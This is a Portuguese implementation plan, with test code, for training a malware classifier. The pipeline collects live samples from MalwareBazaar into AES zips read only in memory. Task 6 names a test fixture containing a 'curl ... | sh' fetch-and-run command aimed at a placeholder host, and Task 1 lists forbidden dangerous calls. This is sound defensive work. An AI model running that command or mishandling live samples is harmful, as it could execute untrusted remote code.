# Classificador local de malware por IA — Plano 2: treino, prova de qualidade e liberação

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Produzir o primeiro modelo real (ELF e scripts), treinado com segurança num ambiente isolado, aprovado ou
reprovado por tipo num portão de qualidade medido, publicado no pacote em modo sombra e, depois de 2 a 4 semanas
revisadas no SUPRA, liberado para isolar.

**Architecture:** Pipeline em `tools/treino/` (fora do pacote), com etapas pequenas e testáveis: corpus em zips AES
nunca extraídos → coleta (MalwareBazaar + legítimos) → higiene e divisões → extração de características em memória
(o **mesmo** `mandacaru.ml.features`) → treino de gradient boosting (scikit-learn) → calibração e limiares →
avaliação e portão → exportação para o JSON estrito do Plano 1 + `golden.json`. A Parte A (código) é toda testada na
`Ubuntu-Dev` com dados sintéticos inofensivos. A Parte B (operação) roda o pipeline com amostras reais só na distro
isolada.

**Tech Stack:** Python ≥ 3.10; dependências **só de treino**, num venv próprio: `scikit-learn`, `numpy`, `pyzipper`
(zip AES); `zstandard` só se o Python for < 3.14 (o 3.14 tem `compression.zstd`). Runtime do Mandacaru continua sem
dependência nova.

**Spec:** `docs/superpowers/specs/2026-11-20-classificador-ia-malware-design.md` (seções 10, 14, 15, 16)

**Depende de:** Plano 1 (`docs/superpowers/plans/2026-11-20-classificador-ia-runtime.md`), já na branch
`feat/classificador-ia` (PR VandyckLN/mandacaru#7). Esta branch, `feat/classificador-ia-treino`, sai dela.

## Global Constraints

- **Regras de ouro (spec 10.2), impostas por teste:** em `tools/treino/` nada de `subprocess`, `pty`, `ctypes`,
  `os.system`, `os.popen`, `os.exec*`, `os.spawn*`, `extractall`, `shutil.unpack_archive`, `os.chmod`/`chmod`; nenhum
  byte de amostra escrito em disco fora do zip AES original; nenhuma ferramenta externa toca em amostra.
- Amostra lida só em memória, com limite de **8 MB** (o mesmo `MAX_BYTES` do produto), conferido pelo tamanho
  declarado no zip **antes** de ler e de novo na leitura.
- Zip das amostras: AES, senha `infected` (padrão do MalwareBazaar). Legítimos também são guardados em zip AES com a
  mesma senha, para um só leitor e para o Mandacaru/antivírus não reagirem.
- Corpus fora de qualquer repositório git, fora das pastas vigiadas e fora de `/mnt`: padrão `~/corpus` (`0700`) no
  usuário `treino` da `UbuntuPentest`. Nunca na `Ubuntu-Dev`.
- Chave do MalwareBazaar só na variável de ambiente `MB_AUTH_KEY`; nunca em arquivo, log ou commit.
- Logs e relatórios só com hashes e números; nunca bytes de amostra.
- Metas do portão (spec 10.4), por tipo: FP ≤ 0,05 % com ≥ 6.000 legítimos no teste; FP por categoria de legítimo
  difícil ≤ 0,5 %; detecção ≥ 80 % nos malwares que as regras atuais deixam passar; ≥ 500 maliciosos no teste; JSON
  ≤ 3 MB; mediana ≤ 30 ms e p99 ≤ 150 ms no SUPRA (já garantidos pelo Plano 1).
- Modelo: `HistGradientBoostingClassifier`, `max_iter ≤ 300`, `max_depth = 8`, um por família (`elf`, `script`).
- Saída do ambiente de treino: só `elf.json`, `script.json`, `golden.json`, `relatorio-<model_id>.md` e
  `manifesto-<model_id>.txt` (hashes). Tudo texto, validado na chegada.
- ruff `line-length = 120`, regras `E, F, W, I, B`. Mensagens em português sem acento. Commits como VandyckLN, sem
  `Co-Authored-By`.

## Review Focus

- Zip com tamanho declarado enorme (bomba) ou maior que 8 MB: a amostra é pulada sem ler o conteúdo (teste na
  Task 2).
- Zip corrompido, com senha errada ou com mais de um membro: pulado com aviso, o pipeline segue (teste na Task 2).
- MalwareBazaar responde erro ou limite diário (`query_status` diferente de `ok`): a coleta para, guarda o progresso
  e retoma depois, sem repetir downloads (teste na Task 3).
- O mesmo hash nos dois lados (malicioso e legítimo): sai dos dois, nunca vira rótulo contraditório (teste na
  Task 5).
- Tipo com poucos dados: os limiares saem no JSON, mas `gate_passed = false` e o motivo vai para o relatório
  (teste na Task 8).

---

# Parte A — Código (Ubuntu-Dev, dados sintéticos)

### Task 1: Esqueleto de `tools/treino/` e teste de política

**Files:**
- Create: `tools/treino/__init__.py` (docstring), `tools/treino/requirements.in` (`scikit-learn`, `numpy`,
  `pyzipper`, `zstandard; python_version < "3.14"`), `tools/treino/requirements.txt` (gerado a partir do `.in` com
  `pip-compile --generate-hashes`, numa venv temporária com `pip-tools`, sem nenhuma amostra envolvida),
  `tools/treino/README.md` (resumo das regras de ouro e link para a Parte B deste plano)
- Create: `tests/test_politica_treino.py`

**Interfaces:**
- Produces: a pasta `tools/treino/` como pacote importável (`import tools.treino.corpus` com `cwd` na raiz do repo;
  os testes põem a raiz no `sys.path` via `conftest` já existente ou `sys.path.insert` no próprio teste).

- [ ] **Step 1: Write the failing test**

```python
import ast
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
TREINO = ROOT / "tools" / "treino"
PROIBIDOS_IMPORT = {"subprocess", "pty", "ctypes"}
PROIBIDOS_ATRIB = {"system", "popen", "execv", "execve", "execl", "execlp", "execvp", "spawnv", "spawnl",
                   "extractall", "unpack_archive", "chmod", "fchmod"}

def violacoes(arquivos):
    achados = []
    for p in arquivos:
        tree = ast.parse(p.read_text(), filename=str(p))
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                achados += [f"{p.name}: import {a.name}" for a in node.names if a.name.split(".")[0] in PROIBIDOS_IMPORT]
            elif isinstance(node, ast.ImportFrom) and (node.module or "").split(".")[0] in PROIBIDOS_IMPORT:
                achados.append(f"{p.name}: from {node.module}")
            elif isinstance(node, ast.Attribute) and node.attr in PROIBIDOS_ATRIB:
                achados.append(f"{p.name}:{node.lineno}: .{node.attr}")
            elif isinstance(node, ast.Attribute) and node.attr.startswith(("exec", "spawn")) \
                    and isinstance(node.value, ast.Name) and node.value.id == "os":
                achados.append(f"{p.name}:{node.lineno}: os.{node.attr}")
    return achados

def test_existe_e_tem_codigo():
    assert (TREINO / "__init__.py").is_file()

def test_nenhum_import_ou_chamada_proibida():
    assert violacoes(sorted(TREINO.rglob("*.py"))) == []

def test_politica_pega_violacao(tmp_path):
    for codigo in ("import subprocess\n", "import os\nos.system('x')\n", "z.extractall('d')\n",
                   "import os\nos.execv('a', [])\n", "from ctypes import CDLL\n"):
        (tmp_path / "ruim.py").write_text(codigo)
        assert violacoes([tmp_path / "ruim.py"]), codigo

def test_treino_fora_do_pacote():
    toml = (ROOT / "pyproject.toml").read_text()
    assert 'where = ["src"]' in toml.split("[tool.setuptools.packages.find]")[1].split("[")[0]
```

- [ ] **Step 2: Run to verify it fails**

Run: `.venv/bin/python -m pytest tests/test_politica_treino.py -q`
Expected: FAIL em `test_existe_e_tem_codigo`

- [ ] **Step 3: Create the files listed above**

- [ ] **Step 4: Run to verify it passes**

Run: `.venv/bin/python -m pytest tests/test_politica_treino.py -q && .venv/bin/ruff check .`
Expected: todos passam

- [ ] **Step 5: Commit**

```bash
git add tools/treino tests/test_politica_treino.py
git commit -m "Treino: esqueleto de tools/treino, dependencias de treino com hash e teste de politica"
```

---

### Task 2: Corpus em zips AES, lido só em memória

**Files:**
- Create: `tools/treino/corpus.py`
- Test: `tests/test_treino_corpus.py` (pula com `pytest.importorskip("pyzipper")`)

**Interfaces:**
- Produces:
  - `SENHA = b"infected"`; `MAX_BYTES = 8 * 1024 * 1024`
  - `@dataclass(frozen=True) class Entry: sha256: str; label: int; source: str; family: str; first_seen: str;
    reporter: str; categoria: str` (`label` 1 = malicioso, 0 = legítimo; `categoria` = `"geral"` ou nome do grupo de
    legítimo difícil: `go_rust_estatico`, `upx_legitimo`, `appimage`, `instalador_run`, `instalador_curl_sh`,
    `build_tmp`, `pip_tmp`)
  - `class Corpus: __init__(self, root: Path)` com pastas `root/malicioso/<sha>.zip`, `root/legitimo/<sha>.zip` e
    manifesto `root/manifesto.jsonl` (uma `Entry` por linha); `root` criada `0700`.
  - `Corpus.add_zip(entry: Entry, zip_bytes: bytes) -> bool` (zip AES já pronto, como vem do MalwareBazaar; confere
    o SHA-256 lendo o membro **em memória**; `False` se não bater, se o zip for inválido ou se o hash já existir)
  - `Corpus.add_bytes(entry: Entry, data: bytes) -> bool` (legítimos: cria o zip AES em memória e grava só o zip)
  - `Corpus.entries() -> list[Entry]`
  - `Corpus.read(entry: Entry) -> bytes | None` (`None` e aviso em stderr para zip corrompido, senha errada, mais de
    um membro, tamanho declarado > `MAX_BYTES` — conferido em `ZipInfo.file_size` **antes** de ler —, ou leitura que
    passe do limite)

- [ ] **Step 1: Write the failing tests**

```python
import hashlib, io, sys
from pathlib import Path
import pytest
pyzipper = pytest.importorskip("pyzipper")
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from tools.treino.corpus import MAX_BYTES, SENHA, Corpus, Entry

def _zip(nome, data, senha=SENHA, membros=1):
    buf = io.BytesIO()
    with pyzipper.AESZipFile(buf, "w", compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES) as z:
        z.setpassword(senha)
        for i in range(membros):
            z.writestr(f"{nome}{i or ''}", data)
    return buf.getvalue()

def _e(sha, label=1):
    return Entry(sha, label, "teste", "Fam", "2026-11-01", "r", "geral")

def test_ida_e_volta_sem_extrair(tmp_path):
    c = Corpus(tmp_path / "c")
    data = b"#!/bin/sh\necho inofensivo\n"
    sha = hashlib.sha256(data).hexdigest()
    assert c.add_zip(_e(sha), _zip(sha, data))
    assert c.read(c.entries()[0]) == data
    arquivos = {p.name for p in (tmp_path / "c").rglob("*") if p.is_file()}
    assert arquivos == {f"{sha}.zip", "manifesto.jsonl"}          # nada extraido no disco
    assert (tmp_path / "c").stat().st_mode & 0o777 == 0o700

def test_hash_errado_duplicado_e_legitimo(tmp_path):
    c = Corpus(tmp_path / "c")
    assert c.add_zip(_e("0" * 64), _zip("x", b"outro")) is False
    data = b"legitimo"
    sha = hashlib.sha256(data).hexdigest()
    assert c.add_bytes(_e(sha, label=0), data) and c.add_bytes(_e(sha, label=0), data) is False
    assert c.read(c.entries()[0]) == data

@pytest.mark.parametrize("zip_ruim", [
    lambda: b"nao e zip",
    lambda: _zip("x", b"a", senha=b"outra"),
    lambda: _zip("x", b"a", membros=2),
])
def test_zip_ruim_e_pulado(tmp_path, zip_ruim, capsys):
    c = Corpus(tmp_path / "c")
    sha = hashlib.sha256(b"a").hexdigest()
    (tmp_path / "c" / "malicioso").mkdir(parents=True, exist_ok=True)
    (tmp_path / "c" / "malicioso" / f"{sha}.zip").write_bytes(zip_ruim())
    assert c.read(_e(sha)) is None and "aviso" in capsys.readouterr().err

def test_tamanho_declarado_acima_do_limite_nao_e_lido(tmp_path):
    c = Corpus(tmp_path / "c")
    data = b"\0" * (MAX_BYTES + 1)
    sha = hashlib.sha256(data).hexdigest()
    assert c.add_zip(_e(sha), _zip(sha, data)) is False           # nem entra
```

- [ ] **Step 2: Run to verify it fails**

Run: `.venv/bin/pip install pyzipper && .venv/bin/python -m pytest tests/test_treino_corpus.py -q`
Expected: FAIL (`ModuleNotFoundError: tools.treino.corpus`)

*(O `pyzipper` entra só no venv de desenvolvimento para os testes; não vai para `[project.dependencies]`. Adicione-o
ao extra `[project.optional-dependencies] dev` em `pyproject.toml`, que o CI já instala.)*

- [ ] **Step 3: Implement `tools/treino/corpus.py`**

Escrita do manifesto e dos zips por arquivo temporário + `os.replace` (pode reaproveitar
`mandacaru.fsutil.atomic_write_text` para o manifesto). Leitura com `zf.open(info).read(MAX_BYTES + 1)`.

- [ ] **Step 4: Run to verify it passes**

Run: `.venv/bin/python -m pytest tests/test_treino_corpus.py tests/test_politica_treino.py -q && .venv/bin/ruff check .`
Expected: todos passam

- [ ] **Step 5: Commit**

```bash
git add tools/treino/corpus.py tests/test_treino_corpus.py pyproject.toml
git commit -m "Treino: corpus em zips AES com manifesto, lido so em memoria e com limite de 8 MB"
```

---

### Task 3: Coleta incremental no MalwareBazaar

**Files:**
- Create: `tools/treino/baixar.py`
- Test: `tests/test_treino_baixar.py`

**Interfaces:**
- Consumes: `Corpus`, `Entry` (Task 2).
- Produces:
  - `API = "https://mb-api.abuse.ch/api/v1/"`; `TIPOS_MB = ("elf", "sh", "py", "pl", "js", "php")`
  - `HttpPost = Callable[[str, dict[str, str], dict[str, str]], tuple[int, bytes]]` (url, cabeçalhos, campos do
    formulário → status, corpo)
  - `listar(tipo: str, *, chave: str, http: HttpPost, limite: int = 1000) -> list[dict]`
    (`query=get_file_type`, `file_type=tipo`, `limit=limite`)
  - `@dataclass class Resultado: baixados: int; pulados: int; parou: str | None`
  - `coletar(corpus: Corpus, *, chave: str, http: HttpPost, tipos=TIPOS_MB, cota: int = 500,
    max_por_familia: int = 300, max_por_remetente: int = 1000) -> Resultado`: lista cada tipo, ignora hashes já no
    corpus, aplica os tetos por família (`signature`, ou `"sem_familia"`) e por remetente (`reporter`) contando o que
    já está no corpus, baixa com `query=get_file` + `sha256_hash` até `cota` e grava com `Corpus.add_zip`.
    `query_status` diferente de `ok` (inclusive limite diário) → para, com `parou` = o status, sem perder o que já
    gravou.
  - `main(argv=None) -> int`: lê `MB_AUTH_KEY` do ambiente (ausente → mensagem e saída 1), `--corpus`, `--cota`;
    imprime só contagens.
- O cabeçalho é `Auth-Key: <chave>`. A chave nunca é impressa nem gravada.

- [ ] **Step 1: Write the failing tests** (HTTP falso, zips feitos com o helper `_zip` da Task 2, importado de
`tests/test_treino_corpus.py` via um helper `tests/treino_helpers.py` com `zip_aes(nome, data)`)

```python
import hashlib, json, sys
from pathlib import Path
import pytest
pytest.importorskip("pyzipper")
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from treino_helpers import zip_aes
from tools.treino.baixar import coletar
from tools.treino.corpus import Corpus

AMOSTRAS = {hashlib.sha256(f"amostra {i}".encode()).hexdigest(): f"amostra {i}".encode() for i in range(6)}

def http_falso(limite_depois=None):
    chamadas = []
    def http(url, cab, campos):
        chamadas.append(campos)
        assert cab["Auth-Key"] == "segredo"
        if campos["query"] == "get_file_type":
            data = [{"sha256_hash": s, "signature": "FamA" if i < 4 else None, "reporter": "r1",
                     "first_seen": f"2026-11-0{i + 1} 00:00:00", "file_type": campos["file_type"]}
                    for i, s in enumerate(AMOSTRAS)] if campos["file_type"] == "elf" else []
            return 200, json.dumps({"query_status": "ok" if data else "no_results", "data": data}).encode()
        n = sum(1 for c in chamadas if c["query"] == "get_file")
        if limite_depois is not None and n > limite_depois:
            return 200, json.dumps({"query_status": "daily_limit_reached"}).encode()
        s = campos["sha256_hash"]
        return 200, zip_aes(s, AMOSTRAS[s])
    return http, chamadas

def test_coleta_com_tetos_e_sem_repetir(tmp_path):
    c = Corpus(tmp_path / "c")
    http, _ = http_falso()
    r = coletar(c, chave="segredo", http=http, cota=10, max_por_familia=3)
    assert r.baixados == 5 and r.parou is None                    # 3 da FamA + 2 sem familia
    http2, chamadas2 = http_falso()
    assert coletar(c, chave="segredo", http=http2, cota=10, max_por_familia=3).baixados == 0
    assert not [x for x in chamadas2 if x["query"] == "get_file"]  # nada baixado de novo

def test_limite_diario_para_e_guarda_o_progresso(tmp_path):
    c = Corpus(tmp_path / "c")
    http, _ = http_falso(limite_depois=2)
    r = coletar(c, chave="segredo", http=http, cota=10)
    assert r.baixados == 2 and r.parou == "daily_limit_reached" and len(c.entries()) == 2

def test_chave_nunca_aparece(tmp_path, capsys, monkeypatch):
    from tools.treino import baixar
    monkeypatch.delenv("MB_AUTH_KEY", raising=False)
    assert baixar.main(["--corpus", str(tmp_path / "c")]) == 1
    monkeypatch.setenv("MB_AUTH_KEY", "segredo")
    monkeypatch.setattr(baixar, "_http_padrao", http_falso()[0])
    baixar.main(["--corpus", str(tmp_path / "c"), "--cota", "1"])
    saida = capsys.readouterr()
    assert "segredo" not in saida.out + saida.err
```

- [ ] **Step 2: Run to verify it fails**

Run: `.venv/bin/python -m pytest tests/test_treino_baixar.py -q`
Expected: FAIL (`ModuleNotFoundError`)

- [ ] **Step 3: Implement `tools/treino/baixar.py` and `tests/treino_helpers.py`**

`_http_padrao` usa `urllib.request` com `data=urllib.parse.urlencode(campos)`, timeout de 60 s e leitura limitada a
`MAX_BYTES + 1 MB`. `first_seen` vira `AAAA-MM-DD`. Família vazia → `"sem_familia"`.

- [ ] **Step 4: Run to verify it passes**

Run: `.venv/bin/python -m pytest tests/test_treino_baixar.py tests/test_politica_treino.py -q && .venv/bin/ruff check .`
Expected: todos passam

- [ ] **Step 5: Commit**

```bash
git add tools/treino/baixar.py tests/test_treino_baixar.py tests/treino_helpers.py
git commit -m "Treino: coleta incremental no MalwareBazaar com tetos por familia e remetente"
```

---

### Task 4: Ingestão de legítimos a partir de pacotes

**Files:**
- Create: `tools/treino/benignos.py`
- Test: `tests/test_treino_benignos.py`

**Interfaces:**
- Consumes: `Corpus`, `Entry` (Task 2); `mandacaru.ml.kind.detect_kind`.
- Produces:
  - `membros_deb(deb: bytes) -> Iterator[tuple[str, bytes]]`: lê o formato `ar` e o `data.tar.{xz,zst,gz}` em
    memória (`lzma`, `compression.zstd` no 3.14 ou `zstandard`, `gzip`), devolvendo `(caminho, bytes)` de membros
    regulares ≤ 8 MB.
  - `membros_arquivo(nome: str, data: bytes) -> Iterator[tuple[str, bytes]]`: `.deb` → `membros_deb`; `.whl`/`.zip`
    → `zipfile`; `.tar.gz`/`.tgz` (sdist do PyPI, pacote do npm) → `tarfile` em memória; qualquer outro → o próprio
    arquivo como um membro.
  - `ingerir(corpus: Corpus, pasta: Path, *, source: str, categoria: str = "geral", first_seen: str) -> int`: para
    cada arquivo da pasta (recursivo), percorre os membros, guarda como legítimo (`label=0`) só os que
    `detect_kind` reconhece, e devolve quantos entraram. Nada é extraído no disco.
  - `main(argv=None) -> int`: `python -m tools.treino.benignos --corpus DIR --pasta DIR --source NOME
    [--categoria NOME] [--data AAAA-MM-DD]`; imprime só a contagem.
- Os downloads ficam fora do código (Parte B): `apt-get download`, `pip download --no-deps`, `npm pack`.

- [ ] **Step 1: Write the failing tests** (montam um `.deb` mínimo em memória: `ar` com `debian-binary`,
`control.tar.xz` vazio e `data.tar.xz` contendo `usr/bin/ola` (script `#!/bin/sh`) e `usr/share/doc/x.txt`; um
`.tgz` estilo npm com `package/index.js` contendo `module.exports = 1;`)

```python
def test_deb_em_memoria(tmp_path):
    pasta = tmp_path / "debs"; pasta.mkdir()
    (pasta / "ola_1.0_all.deb").write_bytes(_deb({"usr/bin/ola": b"#!/bin/sh\necho ola\n",
                                                  "usr/share/doc/x.txt": b"texto"}))
    c = Corpus(tmp_path / "c")
    assert ingerir(c, pasta, source="ubuntu", first_seen="2026-11-20") == 1      # so o script
    [e] = c.entries()
    assert e.label == 0 and e.categoria == "geral" and c.read(e) == b"#!/bin/sh\necho ola\n"
    assert not list((tmp_path / "c").rglob("ola"))                               # nada extraido

def test_npm_tgz_e_categoria(tmp_path):
    pasta = tmp_path / "npm"; pasta.mkdir()
    (pasta / "pkg-1.0.0.tgz").write_bytes(_tgz({"package/index.js": b"const a = require('x');\nmodule.exports = a;\n"}))
    c = Corpus(tmp_path / "c")
    assert ingerir(c, pasta, source="npm", categoria="geral", first_seen="2026-11-20") == 1

def test_membro_grande_e_ignorado(tmp_path):
    membros = dict(membros_arquivo("x.tgz", _tgz({"package/g.js": b"var a=1;\n" * 1_000_000})))
    assert membros == {}
```

- [ ] **Step 2: Run to verify it fails**

Run: `.venv/bin/python -m pytest tests/test_treino_benignos.py -q`
Expected: FAIL (`ModuleNotFoundError`)

- [ ] **Step 3: Implement `tools/treino/benignos.py`** (membro com `TarInfo.size` > 8 MB é ignorado antes de ler)

- [ ] **Step 4: Run to verify it passes**

Run: `.venv/bin/python -m pytest tests/test_treino_benignos.py tests/test_politica_treino.py -q && .venv/bin/ruff check .`
Expected: todos passam

- [ ] **Step 5: Commit**

```bash
git add tools/treino/benignos.py tests/test_treino_benignos.py
git commit -m "Treino: ingestao de legitimos de .deb, wheels, sdists e pacotes npm, tudo em memoria"
```

---

### Task 5: Higiene e divisões

**Files:**
- Create: `tools/treino/higiene.py`
- Test: `tests/test_treino_higiene.py`

**Interfaces:**
- Consumes: `Entry` (Task 2).
- Produces:
  - `remover_conflitos(entries: list[Entry]) -> list[Entry]`: hash com os dois rótulos sai **dos dois** lados.
  - `remover_conhecidos(entries, conhecidos: set[str]) -> list[Entry]`: tira do lado malicioso os hashes que o CIRCL
    conhece como legítimos (o conjunto vem da Parte B; só hashes de amostras saem).
  - `@dataclass(frozen=True) class Divisao: treino: tuple[str, ...]; calibracao: tuple[str, ...]; teste: tuple[str,
    ...]; familias_teste: tuple[str, ...]` (hashes)
  - `dividir(entries, *, corte_teste: str, corte_calibracao: str, frac_familias_teste: float = 0.1, semente: int =
    7) -> Divisao`: maliciosos com `first_seen >= corte_teste` → teste; entre `corte_calibracao` e `corte_teste` →
    calibração; antes → treino. Além disso, uma fração de famílias inteiras (sorteio determinístico pela semente)
    vai **só** para o teste (corte por família). Legítimos: divisão determinística pelo hash (70/15/15), estratificada
    por `categoria`.
  - `HttpJson = Callable[[str, bytes], tuple[int, bytes]]` (url, corpo JSON → status, corpo)
  - `conhecidos_circl(hashes: list[str], *, http: HttpJson, lote: int = 1000) -> set[str]`: `POST
    https://hashlookup.circl.lu/bulk/sha256` com `{"hashes": [...]}` em lotes; devolve os hashes que o CIRCL
    reconhece. Só hashes de **amostras maliciosas** saem (nenhum dado do usuário).
  - `main(argv=None) -> int`: `python -m tools.treino.higiene --corpus DIR --saida ARQUIVO` grava os hashes
    conhecidos, um por linha.
- `first_seen` dos legítimos é a data de coleta: o corte temporal vale para os maliciosos.

- [ ] **Step 1: Write the failing tests**

```python
def test_conflito_sai_dos_dois_lados():
    e = [E("a" * 64, 1), E("a" * 64, 0), E("b" * 64, 1)]
    assert [x.sha256 for x in remover_conflitos(e)] == ["b" * 64]

def test_conhecidos_saem_so_do_lado_malicioso():
    e = [E("a" * 64, 1), E("c" * 64, 0)]
    assert {x.sha256 for x in remover_conhecidos(e, {"a" * 64, "c" * 64})} == {"c" * 64}

def test_circl_em_lotes_so_com_hashes():
    enviados = []
    def http(url, corpo):
        enviados.append(json.loads(corpo))
        return 200, json.dumps([{"SHA-256": h.upper()} for h in enviados[-1]["hashes"][:1]]).encode()
    hs = [f"{i:064x}" for i in range(2500)]
    assert conhecidos_circl(hs, http=http, lote=1000) == {hs[0], hs[1000], hs[2000]}
    assert [len(e["hashes"]) for e in enviados] == [1000, 1000, 500]

def test_divisao_temporal_por_familia_e_deterministica():
    mal = [E(f"{i:064x}", 1, family=f"F{i % 20}", first_seen=f"2026-{1 + i % 12:02d}-01") for i in range(400)]
    leg = [E(f"{i + 10_000:064x}", 0, categoria="go_rust_estatico" if i % 5 == 0 else "geral") for i in range(1000)]
    d1 = dividir(mal + leg, corte_teste="2026-10-01", corte_calibracao="2026-08-01")
    d2 = dividir(mal + leg, corte_teste="2026-10-01", corte_calibracao="2026-08-01")
    assert d1 == d2
    todos = set(d1.treino) | set(d1.calibracao) | set(d1.teste)
    assert len(todos) == 1400 and not (set(d1.treino) & set(d1.teste))
    fam_treino = {e.family for e in mal if e.sha256 in d1.treino}
    assert d1.familias_teste and not (set(d1.familias_teste) & fam_treino)       # familia inteira so no teste
    duros_teste = sum(1 for e in leg if e.sha256 in d1.teste and e.categoria == "go_rust_estatico")
    assert 20 <= duros_teste <= 40                                               # ~15 % de 200
```

(`E(...)` é um helper local que monta `Entry` com padrões.)

- [ ] **Step 2: Run to verify it fails**

Run: `.venv/bin/python -m pytest tests/test_treino_higiene.py -q`
Expected: FAIL

- [ ] **Step 3: Implement `tools/treino/higiene.py`** (divisão dos legítimos por `int(sha256[:8], 16) % 100`)

- [ ] **Step 4: Run to verify it passes**

Run: `.venv/bin/python -m pytest tests/test_treino_higiene.py -q && .venv/bin/ruff check .`
Expected: todos passam

- [ ] **Step 5: Commit**

```bash
git add tools/treino/higiene.py tests/test_treino_higiene.py
git commit -m "Treino: higiene (conflitos, conhecidos) e divisoes temporal e por familia"
```

---

### Task 6: Extração de características e marca do que as regras pegam

**Files:**
- Create: `tools/treino/extrair.py`
- Test: `tests/test_treino_extrair.py`

**Interfaces:**
- Consumes: `Corpus` (Task 2), `Divisao` (Task 5), `mandacaru.ml.kind.detect_kind`,
  `mandacaru.ml.features.extract`/`FAMILY`, `mandacaru.detectors.static.StaticScanner`.
- Produces:
  - `@dataclass class Tabela: X: list[list[float]]; y: list[int]; kind: list[str]; sha: list[str]; parte: list[str];
    categoria: list[str]; regra_alta: list[bool]; regra_media: list[bool]`
  - `extrair(corpus: Corpus, divisao: Divisao, *, budget_s: float = 2.0) -> dict[str, Tabela]` (chaves `"elf"` e
    `"script"`). Para cada entrada da divisão: `corpus.read` → `detect_kind` (`None` → pulada e contada) →
    `extract` → regras do Mandacaru sobre os mesmos bytes (`StaticScanner().scan_bytes(Path(sha), data)`):
    `regra_alta` = alguma regra `>= HIGH`; `regra_media` = alguma `>= MEDIUM`. Estouro de orçamento → pulada e
    contada.
  - `salvar(tabelas, pasta: Path) -> None` / `carregar(pasta: Path) -> dict[str, Tabela]` em JSON (só números e
    hashes).
- O orçamento maior (2 s) só evita perder amostras numa máquina lenta: os valores das características não dependem
  dele.

- [ ] **Step 1: Write the failing tests** (corpus sintético: 3 scripts inofensivos e 1 ELF montado com
`tests/ml_elf.make_elf`; um script contém `curl -s http://exemplo.invalid/x | sh`, que dispara a regra
`Shell_Pipe_To_Interpreter` `MEDIUM`)

```python
def test_extrai_por_familia_com_marca_das_regras(tmp_path):
    c, d = _corpus_e_divisao(tmp_path)
    t = extrair(c, d)
    assert set(t) == {"elf", "script"}
    assert len(t["script"].X[0]) == len(SCRIPT_FEATURE_NAMES) and len(t["elf"].X[0]) == len(ELF_FEATURE_NAMES)
    i = t["script"].sha.index(SHA_CURL)
    assert t["script"].regra_media[i] is True and t["script"].regra_alta[i] is False
    assert t["script"].X[i] == extract("sh", DADOS[SHA_CURL])               # mesmo codigo do produto

def test_salvar_e_carregar(tmp_path):
    c, d = _corpus_e_divisao(tmp_path)
    t = extrair(c, d)
    salvar(t, tmp_path / "tab")
    assert carregar(tmp_path / "tab")["script"].sha == t["script"].sha
```

- [ ] **Step 2: Run to verify it fails**

Run: `.venv/bin/python -m pytest tests/test_treino_extrair.py -q`
Expected: FAIL

- [ ] **Step 3: Implement `tools/treino/extrair.py`**

- [ ] **Step 4: Run to verify it passes**

Run: `.venv/bin/python -m pytest tests/test_treino_extrair.py -q && .venv/bin/ruff check .`
Expected: todos passam

- [ ] **Step 5: Commit**

```bash
git add tools/treino/extrair.py tests/test_treino_extrair.py
git commit -m "Treino: extracao em memoria com o mesmo features.py do produto e marca das regras"
```

---

### Task 7: Treino, calibração e limiares

**Files:**
- Create: `tools/treino/treinar.py`
- Test: `tests/test_treino_treinar.py` (pula com `pytest.importorskip("sklearn")`)

**Interfaces:**
- Consumes: `Tabela` (Task 6).
- Produces:
  - `FP_ALTO = 0.0005`, `FP_ALTO_TMP = 0.00025`, `FP_MEDIO = 0.01`, `MIN_REFORCO = 300`
  - `CATEGORIAS_TMP = ("build_tmp", "pip_tmp", "instalador_curl_sh", "instalador_run")`
  - `@dataclass class Treinado: clf; calib_x: list[float]; calib_y: list[float]; limiares: dict[str, dict[str,
    float]]` (tipo → `alto`, `alto_tmp`, `reforco`, `medio`)
  - `treinar(t: Tabela, *, semente: int = 7, max_iter: int = 300) -> Treinado`:
    1. `HistGradientBoostingClassifier(max_iter=max_iter, max_depth=8, learning_rate=0.1, early_stopping=True,
       random_state=semente)` com o `kind` como característica já embutida (as `tipo_*` existem nos scripts);
    2. `IsotonicRegression(out_of_bounds="clip", y_min=0, y_max=1)` sobre `sigmoide(decision_function)` na parte
       `calibracao`; exporta `X_thresholds_`/`y_thresholds_` como `calib_x`/`calib_y`;
    3. limiares por tipo, na `calibracao`, sobre a probabilidade calibrada dos legítimos do tipo:
       - `alto`: menor limiar com FP ≤ `FP_ALTO`;
       - `alto_tmp`: o mesmo, mas só com os legítimos das `CATEGORIAS_TMP` e meta `FP_ALTO_TMP` (nunca abaixo de
         `alto`);
       - `medio`: menor limiar com FP ≤ `FP_MEDIO` (nunca acima de `alto`);
       - `reforco`: só com os legítimos que têm `regra_media`; com menos de `MIN_REFORCO`, `reforco = alto`.
    - "Menor limiar com FP ≤ meta" = o quantil correspondente das notas dos legítimos, arredondado para cima ao
      próximo valor distinto, preso a [0, 1].
- Garantia ao final: `medio ≤ reforco ≤ alto ≤ alto_tmp` (corrige o menor 10 da revisão do Plano 1 na origem).

- [ ] **Step 1: Write the failing tests** (dados sintéticos separáveis: 3.000 linhas, 2 características
informativas, resto ruído; `kind` = `"sh"`)

```python
def test_limiares_respeitam_o_orcamento_e_a_ordem():
    t = _sintetico(n=3000, semente=1)
    tr = treinar(t, max_iter=50)
    lim = tr.limiares["sh"]
    assert lim["medio"] <= lim["reforco"] <= lim["alto"] <= lim["alto_tmp"] <= 1.0
    probs = _probs_calibracao_legitimos(tr, t)
    assert sum(p >= lim["alto"] for p in probs) / len(probs) <= 0.0005 + 1e-12

def test_reforco_sem_dados_vira_alto():
    t = _sintetico(n=3000, semente=2, regra_media=False)
    assert treinar(t, max_iter=30).limiares["sh"]["reforco"] == treinar(t, max_iter=30).limiares["sh"]["alto"]

def test_deterministico():
    t = _sintetico(n=2000, semente=3)
    assert treinar(t, max_iter=20).limiares == treinar(t, max_iter=20).limiares
```

- [ ] **Step 2: Run to verify it fails**

Run: `.venv/bin/pip install scikit-learn numpy && .venv/bin/python -m pytest tests/test_treino_treinar.py -q`
Expected: FAIL (`ModuleNotFoundError`)

*(`scikit-learn` e `numpy` entram só no extra `dev`, para os testes; o pacote continua sem eles.)*

